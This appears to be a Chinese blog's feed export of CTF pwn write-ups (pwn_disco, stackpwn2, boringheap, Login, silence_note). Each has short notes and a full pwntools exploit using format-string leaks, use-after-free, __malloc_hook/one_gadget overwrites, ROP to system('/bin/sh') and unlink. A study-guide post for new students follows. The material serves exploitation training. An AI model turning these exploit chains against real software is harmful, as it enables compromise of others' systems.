class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-pwn-disco"><a href="#0x02-pwn-disco" class="headerlink" title="0x02 pwn_disco"></a>0x02 pwn_disco</h2><p>说实话本题画风还是挺搞笑的，运行程序的时候我笑了好久。存在漏洞有两个，让这一题变得简单起来，一个是格式化字符串，直接可以泄露出libc基址出来，另一个是UAF,当free堆块之后,存在悬挂指针，直接攻击__malloc_hook然后修改为one_gadget来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-stackpwn2"><a href="#0x03-stackpwn2" class="headerlink" title="0x03 stackpwn2"></a>0x03 stackpwn2</h2><p>这一题真新手向题目，也是存在两个洞，一个是格式化字符串来泄露canary,然后又存在栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./stackpwn2'</span>)</span><br><span class="line"><span class="comment">#p=remote('183.129.189.60',10000)</span></span><br><span class="line">p.recvuntil(<span class="string">'checking the output system...\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。&lt;/p&gt;
&lt;h2 id=&quot;0x01-hard-pwn&quot;&gt;&lt;a href=&quot;#0x01-hard-pwn&quot; class=&quot;headerlink&quot; title=&quot;0x01 
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.github.io/tags/UAF/"/>
    
      <category term="house of orange" scheme="http://Whali3n51.github.io/tags/house-of-orange/"/>
    
  </entry>
  
  <entry>
    <title>上海大学生网络安全PWN_wp</title>
    <link href="http://whali3n51.github.io/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"/>
    <id>http://whali3n51.github.io/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/</id>
    <published>2019-11-11T05:37:00.000Z</published>
    <updated>2020-01-08T07:10:46.589Z</updated>
    
    <content type="html"><![CDATA[<p>最近没怎么更新博客，太忙了，最近得比赛有点多。</p><h2 id="0x01-boringheap"><a href="#0x01-boringheap" class="headerlink" title="0x01 boringheap"></a>0x01 boringheap</h2><p>这一道题主要是存在abs得整型溢出漏洞，当我输入0x80000000的时候，会溢出，会得到一个负数。在这一题里面当我们输入0x80000000的时候，再和0x40取余，会得到-0x20，最后能修改该chunk的chunk头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to delete?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(typd,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'3.Large\n'</span>,str(typd))</span><br><span class="line">p.sendafter(<span class="string">"Input Content:"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to update?\n'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Where you want to update?\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input Content:\n'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to view?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#0 0</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#1 0x40 </span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#2 0x80</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#3 0xc0</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x80000000</span>,<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#6</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span><span class="number">-88</span></span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#7 = 2</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#8 = 3</span></span><br><span class="line">fake_chunk_addr = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]+<span class="number">0x10</span>+<span class="number">0x10</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0x51</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#9</span></span><br><span class="line">__malloc_hook = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,p64(fake_chunk_addr)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#10</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x38</span>+p64(__malloc_hook<span class="number">-0x10</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#11</span></span><br><span class="line">one_offset = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base+one_offset[<span class="number">3</span>]</span><br><span class="line">create(<span class="number">3</span>,p64(one)+<span class="string">'\n'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"3.Large\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-Login"><a href="#0x02-Login" class="headerlink" title="0x02 Login"></a>0x02 Login</h2><p>这一题有两种思路，一种是去爆破密码，还有一种就是去绕过密码验证，泄露got表，最后getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./login")</span></span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">20000</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the password length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input password:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'Input new pass:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the passwords length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input the password:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x18</span>,p64(<span class="number">0x400310</span>)+p64(<span class="number">0x400F2B</span>))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">255</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0x400f33</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x400710</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+libc.search(<span class="string">'/bin/sh'</span>).next())+p64(libc_base+libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">show(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-silence-note"><a href="#0x03-silence-note" class="headerlink" title="0x03 silence_note"></a>0x03 silence_note</h2><p>这道题比赛的时候没有做出来，主要是自己太菜了，眼瞎了，看见限制这么多条件，一直想着怎么去绕过这个条件，却不知道摆在眼前的unlink漏洞，这道题是我赛后复现出来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">"./silent_note"</span>)</span><br><span class="line">p=process(<span class="string">"./silent_note"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(opt)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(opt,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Large\n"</span>,str(opt))</span><br><span class="line">p.sendafter(<span class="string">"Content:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Exit\n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">hack()</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">small_ptr=<span class="number">0x6020d0</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(small_ptr<span class="number">-0x18</span>)+p64(small_ptr<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6020c8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(elf.symbols[<span class="string">'puts'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'calloc'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'calloc'</span>]</span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%leak_libc)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak_libc+libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近没怎么更新博客，太忙了，最近得比赛有点多。&lt;/p&gt;
&lt;h2 id=&quot;0x01-boringheap&quot;&gt;&lt;a href=&quot;#0x01-boringheap&quot; class=&quot;headerlink&quot; title=&quot;0x01 boringheap&quot;&gt;&lt;/a&gt;0x01 borin
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="unlink" scheme="http://Whali3n51.github.io/tags/unlink/"/>
    
      <category term="abs负数溢出" scheme="http://Whali3n51.github.io/tags/abs%E8%B4%9F%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>给新生—关于二进制怎么学习</title>
    <link href="http://whali3n51.github.io/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"/>
    <id>http://whali3n51.github.io/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-01T04:41:00.000Z</published>
    <updated>2020-01-08T07:00:17.112Z</updated>
    
    <content type="html"><![CDATA[<p>二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，或者下一步的学习能给你答案。我给的只是大致的路线，因人而异。不要固执的非要照着我写的这个顺序来，但是都是要学习的。</p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>一定要学C语言。不要说C语言难学怎么着。想学习二进制这方向必须的学好C语言，一遍学不好两遍，两遍学不好三遍。我个人就学习了三遍，每一遍都有新收获。还有一点，C语言不是只听听就完事了，一定动手写，跟着老师写，写完之后自己再写一遍，写完写作业，做笔记写领悟（建议在有道云笔记上面写）。<br>推荐学习时长：每遍两周。可以每遍缩短时长，根据个人情况。<br>推荐课程：<br>小甲鱼 带你学C带你飞：<a href="https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435" target="_blank" rel="noopener">https://www.bilibili.com/video/av27744141?from=search&amp;seid=15059827262621129435</a><br>中国大学MOOC 苏小红讲授的C语言：<a href="https://www.icourse163.org/course/HIT-69005" target="_blank" rel="noopener">https://www.icourse163.org/course/HIT-69005</a><br>周哥教IT C语言深学活用：<a href="https://ke.qq.com/course/242707?taid=1573117671748627" target="_blank" rel="noopener">https://ke.qq.com/course/242707?taid=1573117671748627</a></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>这个时候就可以开始学习使用IDA和OllyDBG，IDA的使用一般网上都有人写一些基础用法，这个时候就不要想视频了，没有视频，看大佬博客，使被动学习转换为主动学习。ollydbg的使用可以看小甲鱼的视频，相信你们也看到了小甲鱼出的一些相关视频。学完这些，新生这个时候就可以开始做一些CTF中的Reverse方向的题来提升自己的信心。随便对C语言的又一次巩固。改天看我心情吧，我写一个IDA的用法。<br>小甲鱼 OD的使用：<a href="https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689" target="_blank" rel="noopener">https://www.bilibili.com/video/av28046265?from=search&amp;seid=4879553389483862689</a><br>推荐CTF网站（一时间只能想起来这几个了）：<br>bugku:<a href="https://ctf.bugku.com/login?next=challenges" target="_blank" rel="noopener">https://ctf.bugku.com/login?next=challenges</a><br>攻防世界(有梯度)：<a href="https://adworld.xctf.org.cn/task" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task</a><br>BUUCTF：<a href="http://buuoj.cn/" target="_blank" rel="noopener">http://buuoj.cn/</a></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步:"></a>第三步:</h2><p>汇编学习，但是我们学习汇编的目的不是想学习C语言一样去写一个东西出来。我们是需要能看懂汇编指令，这个时候你们做过Reverse的题之后，你们就会发现，一打开IDA的那些指令是啥了。<br>推荐视频：<br>小甲鱼 